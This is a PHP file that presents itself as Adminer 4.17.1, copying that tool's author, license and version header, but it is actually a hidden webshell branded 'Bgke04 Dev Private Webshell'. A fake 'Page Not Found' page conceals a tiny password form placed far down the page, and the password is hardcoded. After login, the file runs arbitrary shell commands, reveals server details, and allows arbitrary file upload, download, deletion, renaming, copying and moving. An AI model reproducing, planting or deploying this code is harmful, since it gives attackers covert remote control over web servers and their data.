<?php
/** Adminer - Compact database management
* @link https://www.adminer.org/
* @author Jakub Vrana, https://www.vrana.cz/
* @copyright 2007 Jakub Vrana
* @license https://www.apache.org/licenses/LICENSE-2.0 Apache License, Version 2.0
* @license https://www.gnu.org/licenses/gpl-2.0.html GNU General Public License, version 2 (one or other)
* @version 4.17.1
*/
session_start();
$passwd = "bgke04@";
$timeout = 1200; // 10 menit (600 detik)

// Cek apakah user sudah login
if (isset($_SESSION["auth"]) && (time() - $_SESSION["auth_time"]) < $timeout) {
    echo " ";
    
    // Letakkan kode asli di bawah ini
    function safe_shell_exec($cmd) {
    return function_exists('shell_exec') ? exec($cmd) : " ";
}

// Styling
echo "<style>
body { background-color: #1e1e2f; color: #00bfff; font-family: 'Courier New', monospace; padding: 20px; margin: 0; box-sizing: border-box; font-size: 12px; line-height: 1.5; }
h1, h3 { color: #00bfff; text-align: center; text-shadow: 0px 0px 10px #00bfff; margin-bottom: 15px; }
h1 { font-size: 22px; font-weight: bold; }
h3 { font-size: 14px; }
.form-container { background-color: #2b2b3b; border-radius: 10px; padding: 20px; box-shadow: 0px 0px 20px rgba(0, 191, 255, 0.3); max-width: 500px; margin: 20px auto; text-align: center; }
input { padding: 8px; margin: 8px 0; border-radius: 5px; border: 1px solid #00bfff; background-color: #3b3b4b; color: #fff; width: 100%; box-sizing: border-box; font-size: 12px; }
input[type='submit'] { cursor: pointer; font-weight: bold; background-color: #00bfff; color: #000; border: none; }
input[type='submit']:hover { background-color: #0080ff; color: #fff; }
pre { background-color: #111; padding: 10px; border-radius: 5px; overflow-x: auto; font-size: 12px; border-left: 3px solid #00bfff; }
p { color: #00ffcc; font-size: 12px; }
.error { color: red; font-weight: bold; }
.success { color: #00ffcc; font-weight: bold; }
</style>";

// Header
echo "<h1>Bgke04 Dev Private Webshell</h1>";
echo "<h3>403, Null Byte, Auto Delete, Windows, </h3>";

// System Information
echo "<h3>System Information:</h3><pre>" . php_uname() . "</pre>";

// Disable Functions Check
$disabled_functions = ini_get('disable_functions') ?: "Tidak ada";
echo "<h3>Disabled Functions:</h3><pre>$disabled_functions</pre>";

$php_ini = php_ini_loaded_file();
echo "<h3>PHP.ini Location:</h3><pre>$php_ini</pre>";

// Current Directory
$currentDir = getcwd();
echo "<p>Current Directory: $currentDir</p>";

// Form Change Directory
echo "<form method='POST'>
        <label>New Directory:</label>
        <input type='text' name='new_dir' value='$currentDir' required>
        <input type='submit' name='change_dir' value='Change Directory'>
      </form>";

if (isset($_POST['change_dir'])) {
    $newDir = $_POST['new_dir'];
    if (is_dir($newDir)) {
        chdir($newDir);
        echo "<p class='success'>Directory changed to: " . getcwd() . "</p>";
    } else {
        echo "<p class='error'>Directory does not exist</p>";
    }
}

// Command Execution
echo "<form method='POST'>
        <label>Enter Command:</label>
        <input type='text' name='command' value='id' required>
        <input type='submit' value='Run Command'>
      </form>";

if (isset($_POST['command'])) {
    $output = safe_shell_exec($_POST['command']);
    echo "<h3>Output:</h3><pre>$output</pre>";
}


$currentDir = getcwd(); // Mendapatkan direktori kerja saat ini

if (isset($_FILES['file_upload']) && isset($_POST['dir'])) {
    // Mendapatkan direktori dan memastikan tidak ada / di belakangnya
    $dir = rtrim($_POST['dir'], '/'); // Menghapus / di belakang jika ada
    $uploadPath = $dir . "/" . $_FILES['file_upload']['name'];

    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
        echo "<p class='success'>File uploaded successfully to: $uploadPath</p>";
    } else {
        echo "<p class='error'>File upload failed.</p>";
    }
} else {
    // Form untuk memilih file dan direktori
    echo "<form method='POST' enctype='multipart/form-data'>
            <label>Choose File:</label>
            <input type='file' name='file_upload' required>
            <label>Choose Directory:</label>
            <input type='text' name='dir' value='$currentDir' required>
            <input type='submit' name='upload' value='Upload File'>
          </form>";
}


if (isset($_POST['file'])) {
    $file = $_POST['file'];
    
    // Validasi jika file tersebut benar-benar ada
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "File not found.";
    }
}

echo '<form method="post">
    <input type="text" name="file" placeholder="path file" value="' . $currentDir . '" required>
    <input type="submit" value="Download">
</form>';

// Rename File
echo "<form method='POST'>
        <label>Old Name:</label>
        <input type='text' name='old_name' value='$currentDir' required>
        <label>New Name:</label>
        <input type='text' name='new_name' value='$currentDir' required>
        <input type='submit' name='rename' value='Rename'>
      </form>";

if (isset($_POST['rename'])) {
    $old = $currentDir . "/" . $_POST['old_name'];
    $new = $currentDir . "/" . $_POST['new_name'];
    if (file_exists($old) && rename($old, $new)) {
        echo "<p class='success'>Renamed successfully</p>";
    } else {
        echo "<p class='error'>Rename failed</p>";
    }
}

// Delete File/Folder
echo "<form method='POST'>
        <label>File/Folder to Delete:</label>
        <input type='text' name='delete_target' value='$currentDir' required>
        <input type='submit' name='delete' value='Delete'>
      </form>";

if (isset($_POST['delete'])) {
    $target = $currentDir . "/" . $_POST['delete_target'];
    if (is_file($target) && unlink($target)) {
        echo "<p class='success'>Deleted file</p>";
    } elseif (is_dir($target) && rmdir($target)) {
        echo "<p class='success'>Deleted directory</p>";
    } else {
        echo "<p class='error'>Delete failed</p>";
    }
}

// Copy File
echo "<form method='POST'>
        <label>Source File:</label>
        <input type='text' value='$currentDir' name='copy_source' required>
        <label>Destination Directory:</label>
        <input type='text' name='copy_dest' value='$currentDir' required>
        <input type='submit' name='copy' value='Copy'>
      </form>";

if (isset($_POST['copy'])) {
    $source = $currentDir . "/" . $_POST['copy_source'];
    $destination = $currentDir . "/" . $_POST['copy_dest'] . "/" . basename($source);
    if (copy($source, $destination)) {
        echo "<p class='success'>Copied successfully</p>";
    } else {
        echo "<p class='error'>Copy failed</p>";
    }
}

// Move File
echo "<form method='POST'>
        <label>Source File:</label>
        <input type='text' name='move_source' value='$currentDir' required>
        <label>Destination Directory:</label>
        <input type='text' name='move_dest' value='$currentDir' required>
        <input type='submit' name='move' value='Move'>
      </form>";

if (isset($_POST['move'])) {
    $source = $currentDir . "/" . $_POST['move_source'];
    $destination = $currentDir . "/" . $_POST['move_dest'] . "/" . basename($source);
    if (rename($source, $destination)) {
        echo "<p class='success'>Moved successfully</p>";
    } else {
        echo "<p class='error'>Move failed</p>";
    }
}

// Directory List
$dirList = scandir(getcwd());
echo "<h3>Directory List:</h3>";

foreach ($dirList as $file) {
    if ($file == '.' || $file == '..') continue;

    $color = is_writable($file) ? 'lime' : 'white';
    echo "<pre style='color: $color; display: inline;'>$file</pre>\n";
}

    exit;
}

// Jika form dikirim dan password benar, set session
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["passwd"]) && $_POST["passwd"] === $passwd) {
    $_SESSION["auth"] = true;
    $_SESSION["auth_time"] = time();
    echo "Login berhasil!<br>";
    
    // Letakkan kode asli di bawah ini
    // Cek apakah shell_exec tersedia
function safe_shell_exec($cmd) {
    return function_exists('shell_exec') ? shell_exec($cmd) : "shell_exec() tidak tersedia";
}
// Styling
echo "<style>
body { background-color: #1e1e2f; color: #00bfff; font-family: 'Courier New', monospace; padding: 20px; margin: 0; box-sizing: border-box; font-size: 12px; line-height: 1.5; }
h1, h3 { color: #00bfff; text-align: center; text-shadow: 0px 0px 10px #00bfff; margin-bottom: 15px; }
h1 { font-size: 22px; font-weight: bold; }
h3 { font-size: 14px; }
.form-container { background-color: #2b2b3b; border-radius: 10px; padding: 20px; box-shadow: 0px 0px 20px rgba(0, 191, 255, 0.3); max-width: 500px; margin: 20px auto; text-align: center; }
input { padding: 8px; margin: 8px 0; border-radius: 5px; border: 1px solid #00bfff; background-color: #3b3b4b; color: #fff; width: 100%; box-sizing: border-box; font-size: 12px; }
input[type='submit'] { cursor: pointer; font-weight: bold; background-color: #00bfff; color: #000; border: none; }
input[type='submit']:hover { background-color: #0080ff; color: #fff; }
pre { background-color: #111; padding: 10px; border-radius: 5px; overflow-x: auto; font-size: 12px; border-left: 3px solid #00bfff; display: block; }
p { color: #00ffcc; font-size: 12px; }
.error { color: red; font-weight: bold; }
.success { color: #00ffcc; font-weight: bold; }
</style>";

// Header
echo "<h1>Bgke04 Dev Private Webshell</h1>";
echo "<h3>403, Null Byte, Auto Delete, Windows, </h3>";

// System Information
echo "<h3>System Information:</h3><pre>" . php_uname() . "</pre>";

// Disable Functions Check
$disabled_functions = ini_get('disable_functions') ?: "Tidak ada";
echo "<h3>Disabled Functions:</h3><pre>$disabled_functions</pre>";

$php_ini = php_ini_loaded_file();
echo "<h3>PHP.ini Location:</h3><pre>$php_ini</pre>";


// Current Directory
$currentDir = getcwd();
echo "<p>Current Directory: $currentDir</p>";

// Form Change Directory
echo "<form method='POST'>
        <label>New Directory:</label>
        <input type='text' name='new_dir' value='$currentDir' required>
        <input type='submit' name='change_dir' value='Change Directory'>
      </form>";

if (isset($_POST['change_dir'])) {
    $newDir = $_POST['new_dir'];
    if (is_dir($newDir)) {
        chdir($newDir);
        echo "<p class='success'>Directory changed to: " . getcwd() . "</p>";
    } else {
        echo "<p class='error'>Directory does not exist</p>";
    }
}

// Command Execution
echo "<form method='POST'>
        <label>Enter Command:</label>
        <input type='text' name='command' value='id' required>
        <input type='submit' value='Run Command'>
      </form>";

if (isset($_POST['command'])) {
    $output = safe_shell_exec($_POST['command']);
    echo "<h3>Output:</h3><pre>$output</pre>";
}
$currentDir = getcwd(); // Mendapatkan direktori kerja saat ini

if (isset($_FILES['file_upload']) && isset($_POST['dir'])) {
    // Mendapatkan direktori dan memastikan tidak ada / di belakangnya
    $dir = rtrim($_POST['dir'], '/'); // Menghapus / di belakang jika ada
    $uploadPath = $dir . "/" . $_FILES['file_upload']['name'];

    if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
        echo "<p class='success'>File uploaded successfully to: $uploadPath</p>";
    } else {
        echo "<p class='error'>File upload failed.</p>";
    }
} else {
    // Form untuk memilih file dan direktori
    echo "<form method='POST' enctype='multipart/form-data'>
            <label>Choose File:</label>
            <input type='file' name='file_upload' required>
            <label>Choose Directory:</label>
            <input type='text' name='dir' value='$currentDir' required>
            <input type='submit' name='upload' value='Upload File'>
          </form>";
}


// Rename File
echo "<form method='POST'>
        <label>Old Name:</label>
        <input type='text' name='old_name' value='$currentDir' required>
        <label>New Name:</label>
        <input type='text' name='new_name' value='$currentDir' required>
        <input type='submit' name='rename' value='Rename'>
      </form>";

if (isset($_POST['rename'])) {
    $old = $currentDir . "/" . $_POST['old_name'];
    $new = $currentDir . "/" . $_POST['new_name'];
    if (file_exists($old) && rename($old, $new)) {
        echo "<p class='success'>Renamed successfully</p>";
    } else {
        echo "<p class='error'>Rename failed</p>";
    }
}

// Delete File/Folder
echo "<form method='POST'>
        <label>File/Folder to Delete:</label>
        <input type='text' name='delete_target' value='$currentDir' required>
        <input type='submit' name='delete' value='Delete'>
      </form>";

if (isset($_POST['delete'])) {
    $target = $currentDir . "/" . $_POST['delete_target'];
    if (is_file($target) && unlink($target)) {
        echo "<p class='success'>Deleted file</p>";
    } elseif (is_dir($target) && rmdir($target)) {
        echo "<p class='success'>Deleted directory</p>";
    } else {
        echo "<p class='error'>Delete failed</p>";
    }
}

// Copy File
echo "<form method='POST'>
        <label>Source File:</label>
        <input type='text' value='$currentDir' name='copy_source' required>
        <label>Destination Directory:</label>
        <input type='text' name='copy_dest' value='$currentDir' required>
        <input type='submit' name='copy' value='Copy'>
      </form>";

if (isset($_POST['copy'])) {
    $source = $currentDir . "/" . $_POST['copy_source'];
    $destination = $currentDir . "/" . $_POST['copy_dest'] . "/" . basename($source);
    if (copy($source, $destination)) {
        echo "<p class='success'>Copied successfully</p>";
    } else {
        echo "<p class='error'>Copy failed</p>";
    }
}

// Move File
echo "<form method='POST'>
        <label>Source File:</label>
        <input type='text' name='move_source' value='$currentDir' required>
        <label>Destination Directory:</label>
        <input type='text' name='move_dest' value='$currentDir' required>
        <input type='submit' name='move' value='Move'>
      </form>";

if (isset($_POST['move'])) {
    $source = $currentDir . "/" . $_POST['move_source'];
    $destination = $currentDir . "/" . $_POST['move_dest'] . "/" . basename($source);
    if (rename($source, $destination)) {
        echo "<p class='success'>Moved successfully</p>";
    } else {
        echo "<p class='error'>Move failed</p>";
    }
}
// Directory List
$dirList = scandir(getcwd());
echo "<h3>Directory List:</h3>";

foreach ($dirList as $file) {
    if ($file == '.' || $file == '..') continue;

    $color = is_writable($file) ? 'lime' : 'white';
    echo "<pre style='color: $color; display: inline;'>$file</pre>\n";
}


    exit;
}

// Jika belum login, tampilkan form login
echo '<!DOCTYPE html>
<html>
<head>
    <style>
        body { 
            text-align: center; 
            margin: 0; 
            height: 200vh; /* Bisa di-scroll ke bawah */
            overflow-y: scroll;
        }
        h1 {
            margin-top: 40vh; 
            font-size: 3.5vh;
        }
        form {
            position: absolute;
            top: 250vh; /* Taruh jauh di bawah */
            left: 0px;
        }
        input {
            width: 25px;
            height: 15px;
            font-size: 6px;
            border: 1px solid gray;
            background: white;
            outline: none;
        }
        button {
            width: 5px;
            height: 10px;
            font-size: 5px;
            border: 1px solid gray;
            background: white;
            outline: none;
        }
    </style>
</head>
<body>
    <h1>Page Not Found</h1>
    <form method="post">
        <input type="password" name="passwd">
        <button type="submit">*</button>
    </form>
</body>
</html>';


?>